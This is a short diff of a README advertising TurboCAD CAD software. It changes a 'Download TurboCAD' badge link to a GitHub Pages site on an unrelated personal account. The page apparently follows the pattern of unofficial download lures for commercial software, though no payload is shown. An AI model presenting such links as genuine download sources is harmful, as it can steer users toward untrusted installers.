@@ -2,7 +2,7 @@
 
 TurboCAD is a professional 2D drafting and 3D modeling software used by architects, engineers, designers, and CAD professionals. Whether you're designing floor plans or mechanical parts, TurboCAD delivers precision, speed, and power.
 
-[![Download](https://img.shields.io/badge/⬇️_Download_TurboCAD-blue?style=for-the-badge&logo=windows)](https://turbocad-download.github.io/.github)
+[![Download](https://img.shields.io/badge/⬇️_Download_TurboCAD-blue?style=for-the-badge&logo=windows)](https://matookfj.github.io/.github/turbocad)
 
 ---
 
